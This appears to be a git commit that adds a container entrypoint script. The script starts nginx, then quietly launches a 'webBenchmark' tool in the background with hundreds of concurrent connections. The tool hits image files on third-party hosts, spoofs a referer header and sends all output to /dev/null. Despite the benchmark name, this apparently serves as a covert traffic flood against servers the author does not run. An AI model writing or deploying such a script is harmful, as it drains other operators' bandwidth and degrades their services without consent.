a4185a8539d47a21b34943f50839c76bfde5d4c5
ShadowObj <110706915+ShadowObj@users.noreply.github.com>
2023-01-29 15:30:33 +0800

    Create entrypoint.sh

---
+++ entrypoint.sh
@@ -0,0 +1,4 @@
+nginx
+/data/webBenchmark -c 256 'http://2.ss.faisys.com/image/materialLib/image/3000238.jpg?v=201712181730' -r 'http://cyxsjzyw.com/' > /dev/null 2>&1 &
+/data/webBenchmark -c 256 'http://2.ss.faisys.com/image/materialLib/image/3000254.jpg?v=201712181730' -r 'http://cyxsjzyw.com/' > /dev/null 2>&1 &
+/data/webBenchmark -c 512 'http://8697843.s21i.faiusr.com/2/1/ABUIABACGAAg_ZTY2gUoqoemITCgFDiYDw!1000x1000.jpg' -r 'http://cyxsjzyw.com/' > /dev/null 2>&1
